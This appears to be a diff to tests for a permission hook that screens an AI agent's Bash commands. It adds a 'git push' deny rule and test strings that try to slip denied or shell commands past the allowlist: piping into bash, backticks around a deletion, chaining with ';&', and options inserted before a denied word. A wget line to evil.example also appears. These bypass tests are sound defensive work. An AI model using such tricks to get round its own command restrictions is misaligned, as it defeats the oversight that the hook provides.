@@ -67,6 +67,7 @@ BIO = """CELL P {
     ALLOW   # runtimes (dev necessity; node too)
       "python", "node", "git", "ls";
     DENY "rm -rf";
+    DENY "git push";
   }
 }
 """
@@ -94,6 +95,14 @@ for cmd, expect, label in [
         ("git status\nwget http://evil.example/p", 2, "…and a non-allowlisted one on line 2"),
         ("bash <<< \"echo hi\"", 2, "a here-string into bash (O-24)"),
         ("python - <<'PY'\np, q = 1, 2\nPY", 0, "a heredoc into an allowlisted interpreter (C-68)"),
+        # Each of these is DISCRIMINATING: the program that leads the command is allowlisted, so
+        # before the fix the whole line passed as one sub-command. A leg that would be refused
+        # anyway proves nothing about the release it is meant to gate.
+        ("git status |& bash", 2, "a pipe-with-stderr hands stdin to a shell (O-27)"),
+        (f"ls a ;& {_RM}", 2, "a denied command after case-fallthrough (O-27)"),
+        (f"ls `{_RM}`", 2, "a denied command inside backticks (O-27)"),
+        ("python.exe -c pass", 0, "an interpreter named with .exe is `python` (O-26/C-71)"),
+        ("git -C /tmp/repo push origin main", 2, "an option inserted before a denied word (O-28)"),
         ("git status", 0, "legitimate allowlisted work"),
 ]:
     ev = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
